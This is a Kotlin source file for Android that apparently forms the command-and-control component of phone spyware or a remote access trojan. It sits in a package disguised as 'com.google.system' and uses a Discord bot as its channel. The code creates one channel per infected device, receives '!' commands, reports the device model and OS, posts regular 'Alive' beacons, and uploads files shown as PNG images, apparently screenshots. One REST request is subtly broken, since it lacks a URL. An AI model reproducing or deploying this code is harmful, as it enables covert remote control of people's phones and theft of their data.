package com.google.system

import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.util.UUID
import java.util.concurrent.TimeUnit

class DiscordGatewayClient(
    private val onCommand: (action: String, payload: String?) -> Unit,
    private val onStatus: ((status: String) -> Unit)? = null
) {
    companion object {
        private const val TAG = "DiscordGW"
        private const val OP_DISPATCH = 0
        private const val OP_HELLO = 10
        private const val OP_HEARTBEAT = 1
        private const val OP_IDENTIFY = 2
        private const val OP_RESUME = 6
        private const val OP_RECONNECT = 7
        private const val OP_INVALID_SESSION = 9
        private const val OP_HEARTBEAT_ACK = 11
        private const val DEVICE_HB_INTERVAL = 300000L
    }

    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.SECONDS)
        .writeTimeout(0, TimeUnit.SECONDS)
        .connectTimeout(15, TimeUnit.SECONDS)
        .pingInterval(30, TimeUnit.SECONDS)
        .build()

    private val jsonMedia = "application/json".toMediaType()

    private var ws: WebSocket? = null
    private var scope: CoroutineScope? = null
    private var heartbeatJob: Job? = null
    private var deviceHeartbeatJob: Job? = null
    private var reconnectJob: Job? = null
    private var heartbeatInterval = 41250L
    private var seq: Int? = null
    private var sessionId: String? = null
    private var guildId: String? = null
    private var myChannelId: String? = null
    private var deviceSuffix: String = UUID.randomUUID().toString().take(6)
    private var reconnectAttempt = 0
    private var resuming = false
    private var closing = false
    private var connectVersion = 0L
    private var crashReport: String? = null

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private var debugFile: File? = null

    fun setDebugFile(f: File) { debugFile = f }

    fun setCrashReport(report: String) { crashReport = report }

    private fun debug(msg: String) {
        debugFile?.appendText("${System.currentTimeMillis()} $msg\n")
    }

    fun start(coroutineScope: CoroutineScope) {
        closing = false
        scope = coroutineScope
        status("Init")
        preflightCheck()
    }

    fun stop() {
        closing = true
        heartbeatJob?.cancel()
        deviceHeartbeatJob?.cancel()
        reconnectJob?.cancel()
        ws?.close(1000, "shutdown")
        ws = null
        scope = null
    }

    private fun status(s: String) {
        onStatus?.invoke(s)
    }

    private fun preflightCheck() {
        scope?.launch(Dispatchers.IO) {
            status("Preflight...")
            debug("preflight: starting")
            try {
                val req = Request.Builder()
                    .url("https://discord.com/api/v10/users/@me")
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .build()
                val resp = httpClient.newCall(req).execute()
                resp.use { r ->
                    if (r.isSuccessful) {
                        val body = r.body?.string()
                        val user = body?.let { JSONObject(it).optString("username", "?") } ?: "?"
                        debug("preflight: token OK — $user")
                        status("Token OK")
                        connect()
                    } else {
                        val errBody = r.body?.string()
                        debug("preflight: token FAILED HTTP ${r.code} $errBody")
                        status("Token bad")
                    }
                }
            } catch (e: Exception) {
                debug("preflight: network error ${e.message}")
                status("No network")
            }
        }
    }

    private fun connect() {
        if (closing) return
        connectVersion++
        val myVersion = connectVersion
        ws?.close(1000, "reconnecting")
        ws = null
        debug("connect: opening ws")
        val req = Request.Builder().url(DiscordConfig.GATEWAY_URL).build()
        try {
            ws = client.newWebSocket(req, object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) {
                    debug("ws: onOpen")
                    status("WS open")
                }

                override fun onMessage(ws: WebSocket, text: String) {
                    handleMessage(text)
                }

                override fun onClosing(ws: WebSocket, code: Int, reason: String) {
                    debug("ws: onClosing code=$code reason=$reason")
                    if (!closing) scheduleReconnect()
                }

                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    debug("ws: onClosed code=$code reason=$reason")
                    if (!closing) scheduleReconnect()
                }

                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    debug("ws: onFailure ${t.message}")
                    status("WS fail: ${t.message?.take(40)}")
                    if (!closing) scheduleReconnect()
                }
            })
        } catch (e: Exception) {
            debug("connect: exception ${e.message}")
            status("Conn err")
            if (!closing) scheduleReconnect()
        }
    }

    private fun handleMessage(text: String) {
        try {
            val msg = JSONObject(text)
            val op = msg.optInt("op", -1)
            val d = msg.opt("d")
            val s = msg.optInt("s", -1)
            if (s > 0) seq = s

            when (op) {
                OP_HELLO -> {
                    val hello = d as JSONObject
                    heartbeatInterval = hello.optLong("heartbeat_interval", 41250)
                    reconnectAttempt = 0
                    reconnectJob?.cancel()
                    debug("OP_HELLO heartbeat_interval=$heartbeatInterval")

                    if (resuming && sessionId != null) {
                        resuming = false
                        status("Resuming...")
                        resume()
                    } else {
                        resuming = false
                        sessionId = null
                        status("Identifying...")
                        identify()
                    }
                    startHeartbeat()
                }
                OP_DISPATCH -> handleDispatch(msg.optString("t", ""), d)
                OP_HEARTBEAT_ACK -> { /* all good */ }
                OP_RECONNECT -> {
                    debug("OP_RECONNECT")
                    resuming = sessionId != null
                    scheduleReconnect()
                }
                OP_INVALID_SESSION -> {
                    val canResume = d as? Boolean ?: false
                    debug("OP_INVALID_SESSION resume=$canResume")
                    resuming = canResume && sessionId != null
                    if (!canResume) sessionId = null
                    scheduleReconnect()
                }
            }
        } catch (e: Exception) {
            debug("handleMessage: ${e.message}")
        }
    }

    private fun handleDispatch(type: String, d: Any?) {
        when (type) {
            "READY" -> {
                val data = d as JSONObject
                sessionId = data.optString("session_id", null)
                val user = data.optJSONObject("user")
                debug("READY bot=${user?.optString("username")}")
                status("Ready")
            }
            "RESUMED" -> {
                debug("RESUMED")
                startHeartbeat()
                if (myChannelId == null) {
                    scope?.launch(Dispatchers.IO) { findOrCreateChannelViaRest() }
                }
            }
            "GUILD_CREATE" -> {
                val data = d as JSONObject
                if (guildId == null) {
                    guildId = data.optString("id", null)
                    debug("GUILD_CREATE guild=$guildId")
                }
                if (guildId != null && myChannelId == null) {
                    findOrCreateChannel(data.optJSONArray("channels"))
                }
            }
            "MESSAGE_CREATE" -> {
                val data = d as JSONObject
                val channelId = data.optString("channel_id", "")
                if (channelId == myChannelId) {
                    val content = data.optString("content", "").trim()
                    if (content.startsWith("!")) {
                        val parts = content.substring(1).split(" ", limit = 2)
                        val action = parts[0].lowercase()
                        val payload = parts.getOrNull(1)
                        onCommand(action, payload)
                    }
                }
            }
        }
    }

    private fun findOrCreateChannel(channelsArray: JSONArray?) {
        val prefix = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
        status("Find ch $prefix")
        if (channelsArray != null) {
            for (i in 0 until channelsArray.length()) {
                val ch = channelsArray.getJSONObject(i)
                if (ch.optString("name", "") == prefix) {
                    myChannelId = ch.optString("id", null)
                    debug("Found existing channel: $myChannelId")
                    status("Ch exists")
                    sendOnlineMsg()
                    return
                }
            }
        }
        createChannel(prefix)
    }

    private suspend fun findOrCreateChannelViaRest() {
        val gId = guildId ?: run {
            debug("findOrCreateChannelViaRest: no guildId")
            return
        }
        try {
            val url = "https://discord.com/api/v10/guilds/$gId/channels"
            val req = Request.Builder()
                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                .build()
            val resp = httpClient.newCall(req).execute()
            resp.use { r ->
                if (r.isSuccessful) {
                    val body = r.body?.string()
                    if (body != null) {
                        val channels = JSONArray(body)
                        val prefix = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
                        for (i in 0 until channels.length()) {
                            val ch = channels.getJSONObject(i)
                            if (ch.optString("name", "") == prefix) {
                                myChannelId = ch.optString("id", null)
                                debug("Found via REST: $myChannelId")
                                status("Ch found")
                                sendOnlineMsg()
                                return
                            }
                        }
                        createChannel(prefix)
                    }
                } else {
                    val errBody = r.body?.string()
                    debug("List channels failed: HTTP ${r.code} $errBody")
                    status("List fail")
                }
            }
        } catch (e: Exception) {
            debug("findOrCreateChannelViaRest: ${e.message}")
        }
    }

    private fun createChannel(name: String) {
        scope?.launch(Dispatchers.IO) {
            var attempt = 0
            val maxAttempts = 4
            while (attempt < maxAttempts && myChannelId == null && !closing) {
                status("Create ch $name (${attempt+1}/$maxAttempts)")
                try {
                    val gId = guildId ?: return@launch
                    val json = JSONObject().apply {
                        put("name", name)
                        put("type", 0)
                    }
                    val url = "https://discord.com/api/v10/guilds/$gId/channels"
                    val req = Request.Builder()
                        .url(url)
                        .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                        .header("Content-Type", "application/json")
                        .post(json.toString().toRequestBody(jsonMedia))
                        .build()
                    val resp = executeWithRetry(req)
                    resp.use { r ->
                        if (r.isSuccessful) {
                            val body = r.body?.string()
                            if (body != null) {
                                val ch = JSONObject(body)
                                myChannelId = ch.optString("id", null)
                                debug("Created channel: $myChannelId")
                                status("Ch created")
                                sendOnlineMsg()
                            }
                        } else {
                            val errBody = r.body?.string()
                            debug("Create ch failed (attempt $attempt): HTTP ${r.code} $errBody")
                            status("Ch fail HTTP ${r.code}")
                        }
                    }
                } catch (e: Exception) {
                    debug("createChannel attempt $attempt: ${e.message}")
                }
                if (myChannelId == null && attempt < maxAttempts - 1) {
                    val delay = (1000L shl attempt).coerceAtMost(15000L)
                    delay(delay)
                }
                attempt++
            }
            if (myChannelId == null) {
                debug("Failed to create channel after $maxAttempts attempts")
                status("Ch failed")
            }
        }
    }

    fun sendOnlineMsg() {
        scope?.launch(Dispatchers.IO) {
            status("Online msg")
            sendMsg(":green_circle: **Device Online** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})")
            crashReport?.let { report ->
                delay(500)
                sendMsg(":warning: **Crash Report**\n```\n${report.take(1900)}\n```")
                crashReport = null
            }
            status("Online")
            startDeviceHeartbeat()
        }
    }

    fun sendMsg(text: String) {
        val chId = myChannelId ?: run {
            debug("sendMsg: no channel")
            return
        }
        scope?.launch(Dispatchers.IO) {
            try {
                val json = JSONObject().put("content", text)
                val url = "https://discord.com/api/v10/channels/$chId/messages"
                val req = Request.Builder()
                    .url(url)
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .header("Content-Type", "application/json")
                    .post(json.toString().toRequestBody(jsonMedia))
                    .build()
                val resp = executeWithRetry(req)
                resp.use { r ->
                    if (!r.isSuccessful) {
                        val errBody = r.body?.string()
                        debug("sendMsg failed: HTTP ${r.code} $errBody")
                    }
                }
            } catch (e: Exception) {
                debug("sendMsg: ${e.message}")
            }
        }
    }

    fun sendFile(text: String, fileName: String, fileBytes: ByteArray) {
        val chId = myChannelId ?: return
        scope?.launch(Dispatchers.IO) {
            try {
                val payloadJson = JSONObject().put("content", text)
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("payload_json", null, payloadJson.toString().toRequestBody(jsonMedia))
                    .addFormDataPart("file", fileName, fileBytes.toRequestBody("image/png".toMediaType()))
                    .build()
                val url = "https://discord.com/api/v10/channels/$chId/messages"
                val req = Request.Builder()
                    .url(url)
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .post(body)
                    .build()
                executeWithRetry(req).use { }
            } catch (e: Exception) {
                debug("sendFile: ${e.message}")
            }
        }
    }

    private fun identify() {
        val identify = JSONObject().apply {
            put("op", OP_IDENTIFY)
            put("d", JSONObject().apply {
                put("token", DiscordConfig.BOT_TOKEN)
                put("intents", DiscordConfig.INTENTS)
                put("properties", JSONObject().apply {
                    put("os", "android")
                    put("browser", "okhttp")
                    put("device", "phantom")
                })
            })
        }
        ws?.send(identify.toString())
        debug("sent identify")
    }

    private fun resume() {
        val sid = sessionId ?: run {
            debug("No session to resume"); return
        }
        debug("Attempting resume (seq=$seq)")
        val payload = JSONObject().apply {
            put("op", OP_RESUME)
            put("d", JSONObject().apply {
                put("token", DiscordConfig.BOT_TOKEN)
                put("session_id", sid)
                put("seq", seq ?: JSONObject.NULL)
            })
        }
        ws?.send(payload.toString())
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope?.launch {
            while (isActive) {
                val payload = JSONObject().apply {
                    put("op", OP_HEARTBEAT)
                    put("d", seq ?: JSONObject.NULL)
                }
                ws?.send(payload.toString())
                delay(heartbeatInterval)
            }
        }
    }

    private fun startDeviceHeartbeat() {
        deviceHeartbeatJob?.cancel()
        deviceHeartbeatJob = scope?.launch {
            delay(DEVICE_HB_INTERVAL)
            while (isActive) {
                sendMsg(":heartbeat: **Alive** — ${android.os.Build.MODEL}")
                delay(DEVICE_HB_INTERVAL)
            }
        }
    }

    private fun scheduleReconnect() {
        reconnectJob?.cancel()
        val scheduleVersion = connectVersion
        if (reconnectAttempt > 30) {
            debug("Max reconnect attempts reached")
            status("Gave up")
            return
        }
        reconnectJob = scope?.launch {
            if (closing) return@launch
            val delay = (DiscordConfig.RECONNECT_BASE_DELAY * (1 shl reconnectAttempt))
                .coerceAtMost(DiscordConfig.MAX_RECONNECT_DELAY)
            reconnectAttempt++
            status("Recon ${reconnectAttempt}")
            debug("Reconnect in ${delay}ms (attempt ${reconnectAttempt})")
            delay(delay)
            if (!closing && connectVersion == scheduleVersion) connect()
        }
    }

    private fun executeWithRetry(request: Request): Response {
        var retries = 0
        while (retries < 3) {
            val resp = httpClient.newCall(request).execute()
            if (resp.code == 429) {
                val retryAfter = resp.header("Retry-After")?.toFloatOrNull()?.toLong() ?: 5L
                resp.close()
                Thread.sleep(retryAfter * 1000)
                retries++
                continue
            }
            return resp
        }
        return httpClient.newCall(request).execute()
    }

    fun getChannelId(): String? = myChannelId
    fun getDeviceTag(): String = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
}
